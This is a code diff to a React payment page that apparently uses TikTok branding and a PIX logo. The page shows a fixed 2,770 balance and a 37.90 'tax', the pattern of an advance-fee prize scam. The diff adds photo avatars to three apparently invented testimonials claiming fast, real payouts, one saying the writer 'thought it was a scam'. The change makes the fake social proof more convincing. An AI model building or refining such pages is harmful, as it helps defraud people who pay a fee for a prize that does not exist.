@@ -4,6 +4,9 @@ import { CheckCircle2, Star, User } from "lucide-react";
 import tiktokLogo from "@/assets/tiktok-logo.png";
 import tiktokRound from "@/assets/tiktok-round.png";
 import pixLogo3 from "@/assets/pix-logo-icon-3.png";
+import testimonialMatheus from "@/assets/testimonial-matheus.png";
+import testimonialAna from "@/assets/testimonial-ana.png";
+import testimonialCarlos from "@/assets/testimonial-carlos.png";
 
 const TAX = 37.90;
 const SALDO = 2770.0;
@@ -11,15 +14,18 @@ const SALDO = 2770.0;
 const testimonials = [
 {
   name: "Matheus Henrique Santos",
-  text: '"rapazz e nao foi que esse ngc do gol de premios deu boa aqui tbm familia KKKKKK"'
+  text: '"rapazz e nao foi que esse ngc do gol de premios deu boa aqui tbm familia KKKKKK"',
+  avatar: testimonialMatheus
 },
 {
   name: "Ana Paula Silva",
-  text: '"recebi em menos de 2 minutos, muito rápido! recomendo demais"'
+  text: '"recebi em menos de 2 minutos, muito rápido! recomendo demais"',
+  avatar: testimonialAna
 },
 {
   name: "Carlos Eduardo",
-  text: '"pensei que era golpe mas recebi certinho, top demais!!"'
+  text: '"pensei que era golpe mas recebi certinho, top demais!!"',
+  avatar: testimonialCarlos
 }];
 
 
@@ -138,8 +144,8 @@ const Pagamento = () => {
           {testimonials.map((t) =>
           <div key={t.name} className="min-w-[260px] rounded-2xl bg-white border border-gray-200 p-4">
               <div className="flex items-center gap-3 mb-2">
-                <div className="h-10 w-10 rounded-full bg-gray-200 flex items-center justify-center shrink-0">
-                  <User className="h-5 w-5 text-gray-400" />
+                <div className="h-10 w-10 rounded-full overflow-hidden shrink-0">
+                  <img src={t.avatar} alt={t.name} className="h-full w-full object-cover" />
                 </div>
                 <div>
                   <p className="text-sm font-bold text-black">{t.name}</p>
